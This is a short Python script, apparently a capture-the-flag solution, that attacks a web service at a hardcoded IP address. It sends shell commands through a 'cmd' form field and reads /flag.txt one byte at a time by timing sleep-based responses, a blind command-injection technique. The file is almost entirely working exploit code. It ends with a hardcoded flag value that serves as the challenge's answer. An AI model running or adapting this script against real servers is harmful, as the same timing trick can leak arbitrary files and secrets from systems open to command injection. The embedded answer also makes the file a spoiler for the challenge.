import requests
import time

url = "http://47.105.113.86:40005/"
flag = ""
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-"
timeout = 3

for position in range(1, 100):
    found = False
    for char in charset:
        cmd = f"if [ $(cut -b {position} /flag.txt) = '{char}' ]; then sleep {timeout}; fi"
        try:
            start = time.time()
            response = requests.post(url, data={"cmd": cmd}, timeout=timeout + 2)
            elapsed = time.time() - start
            if elapsed >= timeout:
                flag += char
                print(f"[+] Flag: {flag}")
                found = True
                break
        except:
            continue
    if not found:
        break
# print(f"Flag: {flag}")
flag = "flag{5ki185ca8l1i}"
print(f"Flag: {flag}")